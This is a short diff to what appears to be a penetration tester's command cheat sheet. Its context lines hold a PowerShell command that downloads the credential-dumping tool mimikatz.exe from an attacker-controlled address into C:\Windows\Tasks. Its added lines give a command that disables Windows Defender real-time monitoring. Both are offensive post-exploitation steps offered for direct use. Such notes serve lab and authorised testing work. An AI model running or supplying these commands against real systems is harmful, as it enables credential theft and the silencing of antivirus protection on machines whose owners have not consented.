@@ -9,3 +9,6 @@ Donwload File from Linux:
 
 Copy File:
 # (New-Object System.Net.WebClient).DownloadFile("http://192.168.45.156/mimikatz.exe", "C:\Windows\Tasks\mimikatz.exe")
+
+Disable Windows Defender:
+PS> Set-MpPreference -DisableRealtimeMonitoring $true
